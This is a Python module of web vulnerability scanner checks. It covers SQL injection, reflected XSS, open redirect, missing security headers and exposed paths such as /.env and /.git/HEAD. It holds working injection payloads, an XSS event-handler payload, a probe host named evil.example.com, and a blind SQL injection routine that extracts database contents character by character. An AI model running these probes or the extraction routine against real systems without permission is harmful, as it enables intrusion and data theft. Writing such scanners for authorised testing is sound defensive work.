"""Detection checks. Each returns a finding dict or None.

Confidence model (the anti-self-fool rule): a raw length delta is NEVER a
finding. SQL injection requires a DBMS error marker or a TRUE/FALSE
differential on a stable state anchor; XSS requires the raw probe
(including its quote/bracket) to come back reflected.
"""
import re
import urllib.parse

SQL_ERRORS = [
    ("sqlite", re.compile(r"sqlite3\.[A-Za-z]+Error|sqlite_error|unrecognized token", re.I)),
    ("mysql", re.compile(r"you have an error in your sql syntax|mysql_fetch|ERROR \d{4} \(1", re.I)),
    ("postgres", re.compile(r"pg_query\(\)|PostgreSQL.*ERROR|syntax error at or near", re.I)),
    ("oracle", re.compile(r"ORA-\d{5}", re.I)),
    ("mssql", re.compile(r"Microsoft SQL Native Client|Unclosed quotation mark|Msg \d+, Level", re.I)),
]

_ROW = re.compile(r"<li", re.I)


def _inject(base, value):
    """base must contain the literal placeholder TEST as the param value."""
    return base.replace("TEST", urllib.parse.quote(value, safe=""))


def check_sqli(base, sess):
    """Error-marker sniff + TRUE/FALSE differential oracle."""
    url_err, url_true, url_false = _inject(base, "'"), _inject(base, "' OR '1'='1"), _inject(base, "' AND '1'='2")
    r_err = sess.fetch(url_err)
    r_true = sess.fetch(url_true)
    r_false = sess.fetch(url_false)
    marker = next((name for name, rx in SQL_ERRORS if rx.search(r_err.body or "")), None)
    a_true, a_false = len(_ROW.findall(r_true.body)), len(_ROW.findall(r_false.body))
    differential = (r_true.status == 200 and a_true > a_false and a_false <= len(_ROW.findall(r_err.body)))
    conf = []
    if marker:
        conf.append(f"DBMS error marker: {marker}")
    if differential:
        conf.append(f"TRUE/FALSE differential confirmed ({a_true} vs {a_false} state rows)")
    if not conf:
        return None
    return {"check": "SQL injection", "confidence": conf,
            "vectors": {"error": url_err, "true": url_true, "false": url_false}}


def blind_extract(base, sess, sql_expr, max_len=64):
    """Boolean-based blind extraction of one SELECT expression (lab-proven chain).

    Oracle: TRUE page contains >0 state rows, FALSE contains none. Returns the
    extracted string, or None when the oracle never fires.
    """
    def oracle(cond):
        # trailing "--" comments out whatever the app appends after the param
        r = sess.fetch(_inject(base, f"' AND ({cond}) AND '1'='1' -- "))
        return len(_ROW.findall(r.body)) > 0

    if not oracle("1=1") or oracle("1=2"):
        return None
    length = 0
    for cand in range(1, max_len + 1):
        if oracle(f"length(({sql_expr}))>={cand}"):
            length = cand
        else:
            break
    if not length:
        return None
    out = []
    for pos in range(1, length + 1):
        ch = ""
        # char-equality (not ascii()): portable across sqlite/mysql/postgres
        for code in range(32, 127):
            if oracle(f"substr(({sql_expr}),{pos},1)='{chr(code)}'"):
                ch = chr(code)
                break
        out.append(ch)
    return "".join(out)


_XSS_PROBE_TPL = '{tok}"onmouseover=9>'


def check_xss(base, sess, token):
    """Reflected XSS: probe must come back byte-identical (quote not encoded)."""
    probe = _XSS_PROBE_TPL.format(tok=token)
    r = sess.fetch(_inject(base, probe))
    if r.status != 200 or probe not in r.body:
        return None
    payload = f'<img src=1 onerror="document.title=\'{token}X\'">'
    r2 = sess.fetch(_inject(base, payload))
    if payload in r2.body:
        return {"check": "Reflected XSS",
                "confidence": ["raw reflection of quote+bracket; event-handler payload reflected unescaped"],
                "vectors": {"probe": _inject(base, probe), "payload": _inject(base, payload)}}
    return None


REDIRECT_PARAMS = r"(?:url|next|redirect|target|return|dest|to|go|redir)"
_REDIRECT_PARAMS = re.compile(rf"[?&](\w*{REDIRECT_PARAMS}\w*)=", re.I)


REDIRECT_ENDPOINTS = ("/?to=TEST", "/?redirect=TEST", "/go?to=TEST", "/redirect?url=TEST", "/login?next=TEST")


def _swap_param(page, name, new_value):
    """Replace the value of query param *name* cleanly (no template leftovers)."""
    u = urllib.parse.urlparse(page)
    qs = urllib.parse.parse_qsl(u.query, keep_blank_values=True)
    out = [(k, new_value if k.lower() == name else v) for k, v in qs]
    return u._replace(query=urllib.parse.urlencode(out)).geturl()


def check_open_redirect(root, sess, target=""):
    """Swap redirect-ish params for an external probe host; a 30x to it = hit.

    Probes the user's own target URL (if its param looks redirect-related) plus
    a short list of conventional redirect endpoints.
    """
    evil = "https://evil.example.com/redirect-probe"
    pages = []
    if target and _REDIRECT_PARAMS.search(target):
        pages.append(target)
    pages += [root + p for p in REDIRECT_ENDPOINTS]
    for page in pages:
        for m in _REDIRECT_PARAMS.finditer(page):
            cand = _swap_param(page, m.group(1), evil)
            resp = sess.fetch(cand)
            loc = resp.headers.get("location", "")
            if resp.status in (301, 302, 303, 307, 308) and urllib.parse.urlparse(loc).netloc == "evil.example.com":
                return {"check": "Open redirect", "confidence": [f"{resp.status} Location -> {loc}"],
                        "vectors": {"url": cand}}
    return None


HDR_FLAGS = {
    "content-security-policy": "missing CSP",
    "x-frame-options": "missing X-Frame-Options",
    "strict-transport-security": "missing HSTS (HTTPS only)",
    "x-content-type-options": "missing X-Content-Type-Options",
}


def check_headers(root, sess):
    r = sess.fetch(root + "/")
    if r.status < 0:
        return None
    have = {k.lower() for k in r.headers}
    flags = [f"{h} ({why})" for h, why in HDR_FLAGS.items() if h not in have]
    srv = r.headers.get("server")
    if srv and re.search(r"\d+\.\d+", srv):
        flags.append(f"server version disclosure: {srv}")
    if not flags:
        return None
    return {"check": "Security headers", "confidence": flags, "severity_note": "informational"}


COMMON_PATHS = ("/admin", "/login", "/.env", "/.git/HEAD", "/backup", "/phpinfo.php",
               "/server-status", "/config.bak", "/wp-login.php")


def check_paths(root, sess):
    hits = []
    for path in COMMON_PATHS:
        r = sess.fetch(root + path)
        leak = (path == "/.env" and "DATABASE" in r.body) or (path == "/.git/HEAD" and r.body.startswith("ref:"))
        if r.status == 200 or leak:
            hits.append({"path": path, "status": r.status, "sensitive_leak": leak})
    if not hits:
        return None
    return {"check": "Exposed paths", "confidence": [f"{len(hits)} reachable"], "paths": hits}
